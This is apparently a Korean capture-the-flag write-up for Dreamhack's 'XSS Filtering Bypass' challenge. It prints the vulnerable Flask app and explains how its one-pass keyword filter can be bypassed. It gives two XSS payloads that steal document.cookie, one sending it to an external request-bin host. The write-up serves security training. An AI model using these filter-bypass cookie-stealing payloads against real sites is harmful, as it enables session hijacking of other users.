# [Dreamhack Wargame] XSS Filtering Bypass
### [🚩XSS Filtering Bypass](https://dreamhack.io/wargame/challenges/433/)
  <img width="1070" alt="XSS Filtering Bypass_Description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/23c4613a-26d9-4cfb-ba70-2d862574a32c">

<br/><br/>

## 문제 파일(app.py) 분석
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}" # vuln 페이지에 param 파라미터의 값을 이용자의 입력값으로 하여 URL 주소를 생성함
    return read_url(url, cookie) # read_url 함수에 생성한 주소와 쿠키 값를 인자로 넘겨주어 vuln 페이지에 접속함

# XSS 취약점을 막기 위한 필터링 함수
def xss_filter(text):
    _filter = ["script", "on", "javascript"] # script, on, javascript의 3가지 키워드를 필터링하고 있음
    for f in _filter:
        if f in text.lower(): # 필터링 검사를 수행할 때 사용자의 입력값을 모두 소문자로 변환하여 검사를 진행함 (대소문자 혼용으로 필터링 우회 불가)
            text = text.replace(f, "") # 필터링 키워드가 존재할 경우 이를 공백으로 치환함
    return text


# 인덱스 페이지
@app.route("/")
def index():
    return render_template("index.html")


# vuln 페이지: 이용자가 입력한 값을 출력함
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 전달한 param 파라미터의 값을 가져옴
    param = xss_filter(param) # 전달받은 param(이용자의 입력값)을 xss_filter() 함수를 통해 필터링하여 XSS 취약점을 막으려고 시도함
    return param # param 피라미터의 값을 화면에 그대로 출력함


# flag 페이지: 전달된 URL에 임의 이용자가 접속하게끔 함 (해당 이용자의 쿠키에 FLAG가 존재함)
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET": # GET 메소드로 요청 시
        return render_template("flag.html") # 이용자에게 URL을 입력받는 페이지(flag.html)을 제공함
    elif request.method == "POST": # POST 메소드로 요청 시
        param = request.form.get("param") # 이용자가 전달한 param 파라미터의 값을 가져옴
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}): # param 파라미터의 값과 쿠키에 FLAG를 포함하여 check_xss() 함수를 호출함
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = "" # memo 페이지에서 사용할 변수

# memo 페이지: 이용자가 메모를 남길 수 있으며, 작성한 메모를 화면에 출력함
@app.route("/memo")
def memo():
    global memo_text # memo_text를 전역(global)으로 설정
    text = request.args.get("memo", "") # 이용자가 전달한 memo 파라미터 값을 가져옴
    memo_text += text + "\n" # 전역변수 memo_text에 text와 개행문자를 추가함
    return render_template("memo.html", memo=memo_text) # render_tempalte() 함수를 이용해 memo_text의 내용을 화면에 출력함 ((HTML 엔티티 코드로 변환해 저장)


app.run(host="0.0.0.0", port=8000)
```

<br/><br/>

## 문제 풀이
### 취약점이 존재하는 부분
vuln 페이지에서 전달된 탬플릿 변수를 기록할 때 HTML 엔티티 코드로 변환해 저장해 XSS 취약점이 발생하지 않는 ```render_template``` 함수를 이용하지 않고 ```return```을 통해 이용쟈의 입력값을 페이지에 그대로 출력하기 때문에 XSS 취약점이 발생함
* ```xss_filter()``` 함수를 통해 ```script```, ```on```, ```javascript``` 키워드를 필터링하고 있음 → ```<script>``` 태그, ```on``` 이벤트 핸들러, ```javascript:``` 스키마를 사용할 수 없음
    - 이용자의 입력값을 ```lower()``` 함수로 모두 소문자로 변환한 후 검사를 수행하기 때문에 대소문자 혼용 방법이나 대문자를 이용하는 방법은 사용할 수 없음
    - 키워드를 단순히 ```""```으로 변경하는 방식으로 단순히 치환(제거)하는 방식의 필터링을 한 번 수행하기 때문에 **필터링되는 키워드 사이에 새로운 필터링 키워드를 삽입하는 방식**으로 우회할 수 있음
        + 중간에 삽입된 키워드가 제거되면서 다시 원본 키워드를 만들어내는 원리를 이용함
* 공격에 사용할 수 있는 속성
    | 속성 | 설명 |
    |---|------|
    | location.href | 전체 URL을 반환하거나, URL을 업데이트할 수 있는 속성값 <br/> &nbsp;&nbsp; - ```on```이라는 키워드가 포함되어 있으므로 필터링에 탐지됨 <br/> &nbsp;&nbsp;&nbsp;&nbsp; → ```document``` 속성으로부터 접근하여 ```document['locatio'+'n'].href```과 같은 방식으로 우회 (Computed member access) |
    | document.cookie | 해당 페이지에서 사용하는 쿠키를 읽고, 쓰는 속성값 |

<br/><br/>

### 익스플로잇
#### 방법 1: memo 페이지 이용
1. flag 포인트에서 ```<scrionpt>document['locatio'+'n'].href="/memo?memo="+document.cookie;</scrionpt>```를 입력하고 제출 버튼을 클릭함
    <img width="982" alt="memo_1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/9b541c50-9615-450f-8dcc-056a7289d3b0">

2. "good" 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득함
    <img width="982" alt="memo_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/6cfe766e-19bb-403d-83c0-e0a267ca57d4">

<br/>

#### 방법 2: 외부 웹 서버 이용
1. 외부에서 접근 가능한 웹 서버를 준비함
    - Dreamhack에서 제공하는 드림핵툴즈 서비스의 Request Bin 기능을 이용함
        + Request Bin 항목에서 랜덤한 URL을 생성한 후 이를 이용하여 익스플로잇을 수행함

2. flag 엔드포인트에서 ```<scrionpt>document['locatio'+'n'].href="http://RANDOMHOST.request.dreamhack.games/?memo="+document.cookie;</scrionpt>```를 입력하고 제출 버튼을 클릭함
    <img width="982" alt="webserver_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/19b48d4d-2ac0-4262-959c-9443e88409fb">

3. "good" 알림창이 출력되면 웹 서버의 접속 기록을 확인하여 QueryString 부분에서 임의 이용자의 쿠키 정보(FLAG)를 획득함
    <img width="1527" alt="webserver_3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/8a6eeee4-e523-4f28-be3a-ac6a550e4b8d">
